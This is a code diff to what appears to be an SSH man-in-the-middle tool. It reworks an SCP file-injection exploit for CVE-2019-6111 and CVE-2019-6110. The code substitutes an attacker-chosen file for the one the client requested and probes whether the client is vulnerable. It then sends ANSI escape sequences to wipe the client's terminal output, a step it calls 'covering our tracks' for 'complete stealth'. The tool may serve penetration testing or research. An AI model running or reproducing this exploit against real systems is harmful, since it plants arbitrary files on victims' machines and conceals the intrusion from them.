@@ -43,7 +43,7 @@ class SCPInjectFile(SCPForwarder):
 
         self.injectable = False
         self.inject_file_stat = os.stat(self.args.scp_inject_file)
-        self.file_to_inject = open(self.args.scp_inject_file, 'rb')
+        self.file_to_inject = None
 
     def process_data(self, traffic):
         if traffic == b'\x00':
@@ -52,7 +52,6 @@ class SCPInjectFile(SCPForwarder):
         return traffic
 
     def handle_traffic(self, traffic):
-        logging.debug(traffic)
         if not self.injectable:
             return super(SCPInjectFile, self).handle_traffic(traffic)
         else:
@@ -60,16 +59,11 @@ class SCPInjectFile(SCPForwarder):
 
     def exploit(self):
         def wait_ok():
-            get = self.session.scp_channel.recv(1024)
-            logging.debug("EXPLOIT: " + str(get))
-            assert get == b'\x00'
+            assert self.session.scp_channel.recv(1024)
 
         def send_ok():
-            logging.debug("EXPLOIT: x00")
             self.session.scp_channel.sendall(b'\x00')
 
-        send_ok()
-        wait_ok()
         # This is CVE-2019-6111: whatever file the client requested, we send
         # them 'exploit.txt' instead.
         logging.info('Injecting file %s to channel %d', self.args.scp_inject_file, self.session.scp_channel.get_id())
@@ -77,18 +71,29 @@ class SCPInjectFile(SCPForwarder):
             self.file_command,
             "{0:o}".format(self.inject_file_stat.st_mode)[2:],
             self.inject_file_stat.st_size,
-            self.args.scp_inject_file
+            self.args.scp_inject_file.split('/')[-1]
         )
         logging.info("Sending command %s", command)
         self.session.scp_channel.sendall(command)
-        wait_ok()
+        try:
+            wait_ok()
+        except AssertionError:
+            self.injectable = False
+            logging.info("Client is not vulnerable to CVE-2019-6111")
+            self.hide_tracks()
+            return
+        self.file_to_inject = open(self.args.scp_inject_file, 'rb')
         self.session.scp_channel.sendall(self.file_to_inject.read())
         self.file_to_inject.close()
         send_ok()
         wait_ok()
+        self.hide_tracks()
+        logging.info("Successful exploit CVE-2019-6111 over channel %d", self.session.scp_channel.get_id())
+
+    def hide_tracks(self):
         # This is CVE-2019-6110: the client will display the text that we send
         # to stderr, even if it contains ANSI escape sequences. We can send
         # ANSI codes that clear the current line to hide the fact that a second
         # file was transmitted..
-        logging.info('Covering our tracks by sending ANSI escape sequence')
-        self.session.scp_channel.sendall_stderr("\x1b[1A".encode('ascii'))
+        logging.info('Covering our tracks by sending ANSI escape sequence; complete stealth: \\x1b[1A\\x1b[2K')
+        self.session.scp_channel.sendall_stderr("\x1b[1A\x1b[2K".encode('ascii'))
